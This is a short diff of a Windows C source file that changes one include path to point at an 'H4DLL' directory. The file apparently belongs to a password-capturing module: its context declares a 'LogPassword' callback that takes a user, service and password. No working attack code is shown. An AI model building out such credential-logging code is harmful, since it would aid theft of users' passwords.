@@ -6,7 +6,7 @@
 #include <string.h>
 
 #include <windows.h>
-#include "..\\common.h"
+#include "../../H4DLL/common.h"
 
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
